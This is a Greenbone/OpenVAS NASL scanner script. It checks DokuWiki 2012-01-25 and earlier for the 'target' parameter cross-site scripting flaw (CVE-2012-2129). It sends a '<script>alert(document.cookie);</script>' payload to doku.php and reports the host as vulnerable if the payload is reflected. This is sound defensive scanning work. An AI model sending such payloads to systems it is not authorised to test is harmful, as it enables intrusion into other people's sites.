# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:dokuwiki:dokuwiki";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803008");
  script_version("2023-10-27T05:05:28+0000");
  script_cve_id("CVE-2012-2129");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"2023-10-27 05:05:28 +0000 (Fri, 27 Oct 2023)");
  script_tag(name:"creation_date", value:"2012-08-28 11:26:53 +0530 (Tue, 28 Aug 2012)");
  script_name("DokuWiki 'target' Parameter Cross Site Scripting Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_dokuwiki_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("dokuwiki/installed");

  script_xref(name:"URL", value:"http://secunia.com/advisories/48848");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/53041");
  script_xref(name:"URL", value:"http://ircrash.com/uploads/dokuwiki.txt");
  script_xref(name:"URL", value:"https://bugs.dokuwiki.org/index.php?do=details&task_id=2487");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/111939/DocuWiki-2012-01-25-Cross-Site-Request-Forgery-Cross-Site-Scripting.html");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to insert arbitrary HTML
  and script code, which will be executed in a user's browser session in the
  context of an affected site.");
  script_tag(name:"affected", value:"DokuWiki version 2012-01-25 and prior");
  script_tag(name:"insight", value:"The input passed via 'target' parameter to 'doku.php' script (when 'do' is
  set to 'edit') is not properly validated, which allows attackers to execute
  arbitrary HTML and script code in a user's browser session in the context
  of an affected site.");
  script_tag(name:"solution", value:"Upgrade to DokuWiki version 2012-01-25a or later.");
  script_tag(name:"summary", value:"DokuWiki is prone to a cross-site scripting (XSS) vulnerability.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  script_xref(name:"URL", value:"http://www.splitbrain.org/projects/dokuwiki");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );
if( dir == "/" ) dir = "";

url = dir + "/doku.php?do=edit&id=S9F8W2A&target=<script>alert"+
            "(document.cookie);</script>";

if( http_vuln_check( port:port, url:url,
                     pattern:"<script>alert\(document.cookie\);</script>", check_header:TRUE,
                     extra_check:'content="DokuWiki"/>' ) ) {
  report = http_report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
